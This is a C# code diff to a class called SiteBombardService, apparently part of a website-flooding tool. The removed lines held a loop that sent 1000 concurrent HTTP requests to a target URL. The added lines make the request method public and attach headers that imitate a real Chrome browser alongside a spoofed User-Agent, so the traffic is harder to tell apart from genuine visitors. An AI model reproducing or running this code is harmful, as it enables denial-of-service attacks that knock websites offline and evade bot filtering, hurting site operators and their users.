@@ -1,6 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Net;
 using System.Net.Http;
 using System.Threading;
 using System.Threading.Tasks;
@@ -11,38 +9,14 @@ namespace Core;
 
 public class SiteBombardService : ISiteBombardService
 {
-    private const int IterationsCount = 1000;
-    private readonly IHttpClientFactory _httpClientFactory;
+    private readonly ILogger<SiteBombardService> _logger;
 
-    public SiteBombardService(IHttpClientFactory httpClientFactory)
+    public SiteBombardService(ILogger<SiteBombardService> logger)
     {
-        _httpClientFactory = httpClientFactory;
+        _logger = logger;
     }
 
-    public async Task BombardAsync(string siteUrl, ILogger logger)
-    {
-        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11;
-        
-        var list = new List<Task>(IterationsCount);
-
-        var client = _httpClientFactory.CreateClient("sites");
-
-        var isSuccess = await MakeRequestAsync(siteUrl, logger, client);
-
-        if (!isSuccess)
-        {
-            return;
-        }
-        
-        for (var i = 0; i < IterationsCount; i++)
-        {
-            list.Add(MakeRequestAsync(siteUrl, logger, client));
-        }
-
-        await Task.WhenAll(list);
-    }
-    
-    private static async Task<bool> MakeRequestAsync(string siteUrl, ILogger logger, HttpMessageInvoker client)
+    public async Task<bool> MakeRequestAsync(string siteUrl, HttpMessageInvoker client)
     {
         try
         {
@@ -53,13 +27,18 @@ public class SiteBombardService : ISiteBombardService
             request.Headers.TryAddWithoutValidation("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36");
             request.Headers.TryAddWithoutValidation("Accept-Charset", "ISO-8859-1");
 
+            request.Headers.TryAddWithoutValidation("sec-ch-ua", " Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"");
+            request.Headers.TryAddWithoutValidation("sec-ch-ua-mobile", "?0");
+            request.Headers.TryAddWithoutValidation("sec-ch-ua-platform", "Windows");
+            request.Headers.TryAddWithoutValidation("Upgrade-Insecure-Requests", "1");
+
             var result = await client.SendAsync(request, CancellationToken.None);
 
             return result.IsSuccessStatusCode;
         }
         catch (Exception e)
         {
-            logger.LogError(e, $@"exception on: {siteUrl}. message: {e.Message}");
+            _logger.LogError(e, $@"exception on: {siteUrl}. message: {e.Message}");
             return false;
         }
     }
